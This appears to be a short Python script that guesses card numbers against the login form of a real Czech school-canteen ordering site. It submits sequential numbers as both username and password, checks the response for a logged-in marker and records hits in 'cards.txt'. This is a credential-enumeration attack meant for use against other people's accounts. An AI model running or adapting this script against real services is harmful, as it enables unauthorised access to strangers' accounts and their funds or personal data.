import requests
from pprint import pp, pprint
from time import sleep
from requests.models import Response





def main(passwd):
    
    def add_card(card, valid):




        
        if valid:
            f = open("cards.txt", "a")

            content = card
            content = str(content)
            content = content + '\n'
            f.write(content)
            f.close()
        else:
            f = open("invalid_cards.txt", "a")

            content = card
            content = str(content)
            content = content + '\n'
            f.write(content)
            f.close()            



    url = 'https://secure.ulrichsw.cz/estrava/stara/'
    valid_cards = []
    with requests.session() as session:

        data = {
            'kodzar': '0039',
            'pass': passwd,
            'username': passwd
        }
        r_post = session.post(url, data=data)
        pprint('Tested another card, checking if valid')
            
        
        if 'Ukonèení a odhláení' in r_post.text:
            valid_cards.append(passwd)
            print('card ', passwd, ' is vallid')
            add_card(passwd, True)
        else:
            add_card(passwd, False)
            print('card is not valid skipping to another one...')




passwd = 4342
for x in range(10):
    passwd += 1
    main(passwd)
    sleep(3)
import compare